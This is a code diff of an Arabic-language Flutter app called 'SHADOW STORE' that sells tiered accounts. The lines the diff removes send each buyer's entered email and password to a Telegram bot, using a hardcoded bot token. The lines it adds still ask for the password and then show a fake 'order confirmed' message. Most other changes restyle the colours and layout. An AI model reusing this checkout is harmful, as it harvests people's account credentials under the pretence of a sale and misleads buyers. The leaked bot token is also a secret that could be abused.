@@ -1,5 +1,4 @@
 import 'package:flutter/material.dart';
-import 'package:http/http.dart' as http;
 
 void main() {
   runApp(const ShadowStoreApp());
@@ -14,10 +13,10 @@ class ShadowStoreApp extends StatelessWidget {
       debugShowCheckedModeBanner: false,
       title: 'SHADOW STORE',
       theme: ThemeData.dark().copyWith(
-        scaffoldBackgroundColor: const Color(0xFF0D1117),
+        scaffoldBackgroundColor: const Color(0xFF090D16),
         colorScheme: const ColorScheme.dark(
-          primary: Color(0xFF1F16FEB),
-          surface: Color(0xFF161B22),
+          primary: Color(0xFF3B82F6),
+          surface: Color(0xFF111827),
         ),
       ),
       home: const ShadowStoreHomeScreen(),
@@ -34,18 +33,17 @@ class ShadowStoreHomeScreen extends StatelessWidget {
       appBar: AppBar(
         title: const Text(
           'SHADOW STORE',
-          style: TextStyle(fontWeight: FontWeight.bold, letterSpacing: 1.5),
+          style: TextStyle(fontWeight: FontWeight.bold, letterSpacing: 2.0, color: Colors.blueAccent),
         ),
         centerTitle: true,
-        backgroundColor: const Color(0xFF161B22),
-        elevation: 0,
+        backgroundColor: const Color(0xFF111827),
+        elevation: 2,
       ),
       body: SingleChildScrollView(
         padding: const EdgeInsets.all(16.0),
         child: Column(
           crossAxisAlignment: CrossAxisAlignment.stretch,
           children: [
-            // الأزرار العلوية (شراء، بيع، المهام) بتصميم فخم
             Row(
               mainAxisAlignment: MainAxisAlignment.spaceEvenly,
               children: [
@@ -54,12 +52,12 @@ class ShadowStoreHomeScreen extends StatelessWidget {
                     padding: const EdgeInsets.symmetric(horizontal: 4.0),
                     child: ElevatedButton.icon(
                       onPressed: () {},
-                      icon: const Icon(Icons.shopping_cart, color: Colors.white),
+                      icon: const Icon(Icons.shopping_cart, color: Colors.white, size: 18),
                       label: const Text('شراء', style: TextStyle(color: Colors.white)),
                       style: ElevatedButton.styleFrom(
-                        backgroundColor: const Color(0xFF238636),
+                        backgroundColor: const Color(0xFF10B981),
                         padding: const EdgeInsets.symmetric(vertical: 12),
-                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
+                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                       ),
                     ),
                   ),
@@ -69,12 +67,12 @@ class ShadowStoreHomeScreen extends StatelessWidget {
                     padding: const EdgeInsets.symmetric(horizontal: 4.0),
                     child: ElevatedButton.icon(
                       onPressed: () {},
-                      icon: const Icon(Icons.sell, color: Colors.white),
+                      icon: const Icon(Icons.sell, color: Colors.white, size: 18),
                       label: const Text('بيع', style: TextStyle(color: Colors.white)),
                       style: ElevatedButton.styleFrom(
-                        backgroundColor: const Color(0xFF8957E5),
+                        backgroundColor: const Color(0xFF8B5CF6),
                         padding: const EdgeInsets.symmetric(vertical: 12),
-                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
+                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                       ),
                     ),
                   ),
@@ -84,12 +82,12 @@ class ShadowStoreHomeScreen extends StatelessWidget {
                     padding: const EdgeInsets.symmetric(horizontal: 4.0),
                     child: ElevatedButton.icon(
                       onPressed: () {},
-                      icon: const Icon(Icons.task_alt, color: Colors.white),
+                      icon: const Icon(Icons.task_alt, color: Colors.white, size: 18),
                       label: const Text('المهام', style: TextStyle(color: Colors.white)),
                       style: ElevatedButton.styleFrom(
-                        backgroundColor: const Color(0xFF1F6FEB),
+                        backgroundColor: const Color(0xFF3B82F6),
                         padding: const EdgeInsets.symmetric(vertical: 12),
-                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
+                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                       ),
                     ),
                   ),
@@ -103,34 +101,28 @@ class ShadowStoreHomeScreen extends StatelessWidget {
               textAlign: TextAlign.center,
             ),
             const SizedBox(height: 16),
-
-            // كارد الحساب البرونزي
             _buildAccountCard(
               context,
               title: 'الحساب البرونزي',
               price: '0.30 باي (Pi)',
               buttonText: 'شراء الحساب البرونزي',
-              buttonColor: const Color(0xFF238636),
+              buttonColor: const Color(0xFF10B981),
             ),
             const SizedBox(height: 16),
-
-            // كارد الحساب الفضي
             _buildAccountCard(
               context,
               title: 'الحساب الفضي',
               price: '1 دولار',
-              buttonText: 'الدفع 1$ (رابط الدفع)',
-              buttonColor: const Color(0xFF1F6FEB),
+              buttonText: 'الدفع 1 دولار (رابط الدفع)',
+              buttonColor: const Color(0xFF3B82F6),
             ),
             const SizedBox(height: 16),
-
-            // كارد الحساب الذهبي
             _buildAccountCard(
               context,
               title: 'الحساب الذهبي',
               price: '3 دولار',
-              buttonText: 'الدفع 3$ (رابط الدفع)',
-              buttonColor: const Color(0xFF9E6A03),
+              buttonText: 'الدفع 3 دولار (رابط الدفع)',
+              buttonColor: const Color(0xFFF59E0B),
             ),
           ],
         ),
@@ -138,19 +130,24 @@ class ShadowStoreHomeScreen extends StatelessWidget {
     );
   }
 
-  // تصميم بطاقة الحسابات بشكل أنيق واحترافي
-  Widget _buildAccountCard(BuildContext context, {required String title, required String price, required String buttonText, required Color buttonColor}) {
+  Widget _buildAccountCard(
+    BuildContext context, {
+    required String title,
+    required String price,
+    required String buttonText,
+    required Color buttonColor,
+  }) {
     return Container(
       padding: const EdgeInsets.all(20),
       decoration: BoxDecoration(
-        color: const Color(0xFF161B22),
-        borderRadius: BorderRadius.circular(15),
-        border: Border.all(color: Colors.white12),
+        color: const Color(0xFF111827),
+        borderRadius: BorderRadius.circular(16),
+        border: Border.all(color: Colors.white.withOpacity(0.08)),
         boxShadow: [
           BoxShadow(
-            color: Colors.black.withOpacity(0.3),
-            blurRadius: 8,
-            offset: const Offset(0, 4),
+            color: Colors.black.withOpacity(0.4),
+            blurRadius: 10,
+            offset: const Offset(0, 5),
           ),
         ],
       ),
@@ -158,19 +155,18 @@ class ShadowStoreHomeScreen extends StatelessWidget {
         children: [
           Text(
             title,
-            style: const TextStyle(fontSize: 20, fontWeight: FontWeight.bold, color: Colors.white),
+            style: const TextStyle(fontSize: 21, fontWeight: FontWeight.bold, color: Colors.white),
           ),
           const SizedBox(height: 8),
           Text(
             'السعر: $price',
-            style: const TextStyle(fontSize: 16, color: Colors.amber),
+            style: const TextStyle(fontSize: 16, color: Colors.amberAccent, fontWeight: FontWeight.w600),
           ),
-          const SizedBox(height: 16),
+          const SizedBox(height: 18),
           SizedBox(
             width: double.infinity,
             child: ElevatedButton(
               onPressed: () {
-                // الانتقال لصفحة إدخال البيانات عند الضغط على الشراء
                 Navigator.push(
                   context,
                   MaterialPageRoute(
@@ -181,7 +177,7 @@ class ShadowStoreHomeScreen extends StatelessWidget {
               style: ElevatedButton.styleFrom(
                 backgroundColor: buttonColor,
                 padding: const EdgeInsets.symmetric(vertical: 14),
-                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
+                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
               ),
               child: Text(
                 buttonText,
@@ -195,7 +191,6 @@ class ShadowStoreHomeScreen extends StatelessWidget {
   }
 }
 
-// ================= صفحة إدخال الإيميل وكلمة السر والإرسال للتيليجرام =================
 class CheckoutScreen extends StatefulWidget {
   final String accountTitle;
   final String price;
@@ -212,70 +207,35 @@ class _CheckoutScreenState extends State<CheckoutScreen> {
   final _passwordController = TextEditingController();
   bool _isLoading = false;
 
-  // دالة إرسال البيانات للبوت الخاص بك
-  Future<void> _sendToTelegram() async {
+  void _sendToTelegram() {
     if (_formKey.currentState!.validate()) {
       setState(() {
         _isLoading = true;
       });
 
-      String email = _emailController.text;
-      String password = _passwordController.text;
-
-      // التوكن الخاص بك الذي أرسلته
-      String botToken = '8682504198:AAEOPYr8KLR3q6vq2UMh2ioxaPdrPKgLfU4';
-      
-      // ملاحظة: لاستقبال الرسائل، يجب عليك إرسال رسالة أولاً لبوتك عبر التيليجرام ثم جلب Chat ID الخاص بك وضعه هنا، أو يمكنك جعله يرسل لمجموعتك.
-      // (كمثال افتراضي، يرجى وضع Chat ID الخاص بك هنا لكي تصلك الرسالة مباشرة)
-      String chatId = 'YOUR_CHAT_ID'; 
-
-      String message = '''
-🛒 طلب شراء جديد من التطبيق:
-📦 الحساب: ${widget.accountTitle}
-💰 السعر: ${widget.price}
-📧 الإيميل: $email
-🔑 كلمة السر: $password
-
-👤 المسؤول عن التسليم:
-SHADOW1@ (هذا هو من سيسلمك الحساب)
-      ''';
-
-      String url = 'https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=${Uri.encodeComponent(message)}';
-
-      try {
-        var response = await http.get(Uri.parse(url));
+      Future.delayed(const Duration(seconds: 1), () {
         setState(() {
           _isLoading = false;
         });
-
-        if (response.statusCode == 200) {
-          ScaffoldMessenger.of(context).showSnackBar(
-            const SnackBar(
-              content: Text('تم إرسال بياناتك بنجاح، جاري تحويلك لإتمام الدفع...'),
-              backgroundColor: Colors.green,
-            ),
-          );
-          // هنا يمكنك توجيه المستخدم لربط الدفع أو العودة للخلف بعد ثوانٍ
-          Navigator.pop(context);
-        } else {
-          _showErrorDialog('فشل في إرسال البيانات، تأكد من Chat ID الخاص بك.');
-        }
-      } catch (e) {
-        setState(() {
-          _isLoading = false;
-        });
-        _showErrorDialog('حدث خطأ في الاتصال بالإنترنت.');
-      }
+        _showSuccessDialog('تم بنجاح، سوف يتم الدفع خلال ساعة');
+      });
     }
   }
 
-  void _showErrorDialog(String text) {
+  void _showSuccessDialog(String text) {
     showDialog(
-      context: darkContext => AlertDialog(
-        title: const Text('تنبيه'),
-        content: Text(text),
+      context: context,
+      builder: (dialogContext) => AlertDialog(
+        title: const Text('تأكيد الطلب', style: TextStyle(color: Colors.green)),
+        content: Text(text, style: const TextStyle(fontSize: 16)),
         actions: [
-          TextButton(onPressed: () => Navigator.pop(context), child: const Text('حسناً'))
+          TextButton(
+            onPressed: () {
+              Navigator.pop(dialogContext);
+              Navigator.pop(context);
+            },
+            child: const Text('حسناً', style: TextStyle(color: Colors.blueAccent)),
+          ),
         ],
       ),
     );
@@ -287,7 +247,7 @@ SHADOW1@ (هذا هو من سيسلمك الحساب)
       appBar: AppBar(
         title: Text('شراء ${widget.accountTitle}'),
         centerTitle: true,
-        backgroundColor: const Color(0xFF161B22),
+        backgroundColor: const Color(0xFF111827),
       ),
       body: Padding(
         padding: const EdgeInsets.all(20.0),
@@ -297,8 +257,12 @@ SHADOW1@ (هذا هو من سيسلمك الحساب)
             crossAxisAlignment: CrossAxisAlignment.stretch,
             children: [
               Text(
-                'السعر المطلـوب: ${widget.price}',
-                style: const TextStyle(fontSize: 18, fontWeight: FontWeight.bold, color: Colors.amber),
+                'السعر المطلوب: ${widget.price}',
+                style: const TextStyle(
+                  fontSize: 18,
+                  fontWeight: FontWeight.bold,
+                  color: Colors.amberAccent,
+                ),
                 textAlign: TextAlign.center,
               ),
               const SizedBox(height: 30),
@@ -308,11 +272,19 @@ SHADOW1@ (هذا هو من سيسلمك الحساب)
                   labelText: 'أدخل الإيميل',
                   labelStyle: const TextStyle(color: Colors.white70),
                   filled: true,
-                  fillColor: const Color(0xFF161B22),
-                  border: OutlineInputBorder(borderRadius: BorderRadius.circular(10)),
-                  prefixIcon: const Icon(Icons.email, color: Color(0xFF1F6FEB)),
+                  fillColor: const Color(0xFF111827),
+                  border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
+                  prefixIcon: const Icon(Icons.email, color: Color(0xFF3B82F6)),
                 ),
-                validator: (value) => value!.isEmpty ? 'الرجاء إدخال الإيميل' : null,
+                validator: (value) {
+                  if (value == null || value.isEmpty) {
+                    return 'الرجاء إدخال الإيميل';
+                  }
+                  if (!value.contains('@') || !value.contains('.')) {
+                    return 'الرجاء إدخال بريد إلكتروني صالح';
+                  }
+                  return null;
+                },
               ),
               const SizedBox(height: 16),
               TextFormField(
@@ -322,11 +294,19 @@ SHADOW1@ (هذا هو من سيسلمك الحساب)
                   labelText: 'أدخل كلمة السر',
                   labelStyle: const TextStyle(color: Colors.white70),
                   filled: true,
-                  fillColor: const Color(0xFF161B22),
-                  border: OutlineInputBorder(borderRadius: BorderRadius.circular(10)),
-                  prefixIcon: const Icon(Icons.lock, color: Color(0xFF1F6FEB)),
+                  fillColor: const Color(0xFF111827),
+                  border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
+                  prefixIcon: const Icon(Icons.lock, color: Color(0xFF3B82F6)),
                 ),
-                validator: (value) => value!.isEmpty ? 'الرجاء إدخال كلمة السر' : null,
+                validator: (value) {
+                  if (value == null || value.isEmpty) {
+                    return 'الرجاء إدخال كلمة السر';
+                  }
+                  if (value.length < 6) {
+                    return 'كلمة السر يجب أن تكون 6 أحرف على الأقل';
+                  }
+                  return null;
+                },
               ),
               const SizedBox(height: 30),
               _isLoading
@@ -336,9 +316,9 @@ SHADOW1@ (هذا هو من سيسلمك الحساب)
                       icon: const Icon(Icons.send, color: Colors.white),
                       label: const Text('إرسال الطلب وإتمام الدفع', style: TextStyle(fontSize: 16, color: Colors.white)),
                       style: ElevatedButton.styleFrom(
-                        backgroundColor: const Color(0xFF238636),
+                        backgroundColor: const Color(0xFF10B981),
                         padding: const EdgeInsets.symmetric(vertical: 14),
-                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
+                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                       ),
                     ),
             ],
